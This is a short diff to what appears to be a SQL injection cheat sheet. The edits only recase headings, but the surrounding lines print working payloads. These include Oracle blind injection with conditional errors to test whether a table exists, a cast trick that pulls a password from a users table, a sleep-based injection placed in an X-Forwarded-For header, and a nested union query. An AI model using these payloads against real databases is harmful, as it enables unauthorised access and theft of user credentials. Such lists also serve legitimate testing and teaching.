@@ -269,7 +269,7 @@ and 1=2 union select null,null,[column name here],null from [table name here]
 ' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.
 ```
 
-### Blind SQL injection with conditional errors to determine a table, other info exist or not
+### Blind SQL Injection with Conditional Errors to Determine Table, Other Info Exist or Not
 ```sql
 ' || (select ' ' from [table name here] where rownum = 1) || '-- - >> Oracle #200 ok means that table exists.
 
@@ -317,12 +317,12 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 '||cast((select password from users LIMIT 1) AS INT)--
 ```
 
-### HTTP Header based SQLi
+### HTTP Header Based SQL Injection
 ```sql
 x-forwarded-for: 127.0.0.1' union select 1,2,3 and sleep(2)-- -
 ```
 
-### Inception based SQLi
+### Inception Based SQL Injection
 ```sql
 and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
 ```
